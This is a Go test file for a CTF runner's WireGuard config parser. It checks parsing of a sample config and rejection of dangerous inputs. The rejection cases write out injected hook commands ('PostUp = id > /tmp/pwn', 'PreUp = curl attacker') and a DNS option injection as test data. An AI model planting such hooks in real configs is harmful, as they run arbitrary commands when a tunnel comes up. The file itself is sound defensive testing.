package ctfrunner

import (
	"strings"
	"testing"
)

const sampleTPCTFConf = `[Interface]
PrivateKey = YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWE=
Address = 172.17.112.254/32
DNS = 172.17.112.3, 1.1.1.1, 8.8.8.8

[Peer]
PublicKey = YmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmI=
Endpoint = node7.tpctf.ctfy.run:44749
AllowedIPs = 172.17.112.0/24
PersistentKeepalive = 25
`

func TestParseWireGuardConfigSample(t *testing.T) {
	prof, err := ParseWireGuardConfig(sampleTPCTFConf)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if prof.Hash == "" || len(prof.Hash) != 64 {
		t.Fatalf("unexpected hash: %q", prof.Hash)
	}
	if prof.Address != "172.17.112.254/32" {
		t.Fatalf("unexpected address: %q", prof.Address)
	}
	if prof.Endpoint != "node7.tpctf.ctfy.run:44749" {
		t.Fatalf("unexpected endpoint: %q", prof.Endpoint)
	}
	if len(prof.DNS) != 3 || prof.DNS[0] != "172.17.112.3" {
		t.Fatalf("unexpected DNS: %+v", prof.DNS)
	}
	if len(prof.AllowedIPs) != 1 || prof.AllowedIPs[0] != "172.17.112.0/24" {
		t.Fatalf("unexpected AllowedIPs: %+v", prof.AllowedIPs)
	}
	if prof.PersistentKeepalive != 25 {
		t.Fatalf("unexpected keepalive: %d", prof.PersistentKeepalive)
	}
	if strings.Contains(prof.RunnerConfig, "DNS =") {
		t.Fatalf("runner config should strip DNS for container wg-quick compatibility:\n%s", prof.RunnerConfig)
	}
	roundtrip, err := ParseWireGuardConfig(prof.RawSanitized)
	if err != nil || roundtrip.Hash != prof.Hash {
		t.Fatalf("roundtrip hash mismatch: %v %q != %q", err, roundtrip.Hash, prof.Hash)
	}
	summary := prof.Summary("ctfy-40099377a2.conf")
	if !summary.Enabled || summary.Filename != "ctfy-40099377a2.conf" || summary.Endpoint != prof.Endpoint {
		t.Fatalf("unexpected summary: %+v", summary)
	}
}

func TestParseWireGuardConfigRejectsDangerousHooks(t *testing.T) {
	cases := []struct {
		name string
		conf string
	}{
		{
			name: "PostUp",
			conf: sampleTPCTFConf + "\n[Interface]\n",
		},
		{
			name: "PostUpInInterface",
			conf: strings.Replace(sampleTPCTFConf, "DNS = 172.17.112.3, 1.1.1.1, 8.8.8.8", "PostUp = id > /tmp/pwn", 1),
		},
		{
			name: "PreUpInPeer",
			conf: sampleTPCTFConf + "PreUp = curl attacker\n",
		},
		{
			name: "BadDNSOptionInjection",
			conf: strings.Replace(sampleTPCTFConf, "DNS = 172.17.112.3, 1.1.1.1, 8.8.8.8", "DNS = 1.1.1.1\\noptions ndots:0", 1),
		},
		{
			name: "InvalidKey",
			conf: strings.Replace(sampleTPCTFConf, "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWE=", "not-a-key", 1),
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := ParseWireGuardConfig(tc.conf); err == nil {
				t.Fatalf("expected error for %s", tc.name)
			}
		})
	}
}
